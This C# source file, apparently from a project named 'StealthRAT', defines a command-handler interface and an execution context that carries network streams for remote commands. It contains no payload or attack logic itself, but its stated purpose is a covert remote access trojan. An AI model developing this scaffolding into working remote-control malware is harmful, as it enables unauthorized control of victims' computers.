namespace StealthRAT.Interfaces;

/// <summary>
/// Defines a contract for handling specific remote commands.
/// Each command type implements this interface, following the Command pattern
/// for extensibility and separation of concerns.
/// </summary>
public interface ICommandHandler
{
    /// <summary>
    /// Gets the command keyword that this handler responds to.
    /// Must be lowercase and unique across all registered handlers.
    /// </summary>
    string CommandName { get; }

    /// <summary>
    /// Executes the command with the provided arguments.
    /// </summary>
    /// <param name="args">The command arguments (excluding the command name itself).</param>
    /// <param name="context">The execution context providing access to network streams.</param>
    /// <returns>A response string indicating success (prefixed with "OK:") or failure (prefixed with "ERR:").</returns>
    Task<string> ExecuteAsync(string[] args, CommandContext context);
}

/// <summary>
/// Provides contextual information needed during command execution,
/// including access to network streams for bidirectional communication.
/// </summary>
public class CommandContext
{
    /// <summary>
    /// Gets the StreamWriter for sending responses back to the client.
    /// </summary>
    public required StreamWriter Writer { get; init; }

    /// <summary>
    /// Gets the underlying NetworkStream for raw data transfer operations.
    /// </summary>
    public required System.Net.Sockets.NetworkStream Stream { get; init; }

    /// <summary>
    /// Gets the cancellation token for cooperative cancellation support.
    /// </summary>
    public required CancellationToken CancellationToken { get; init; }
}
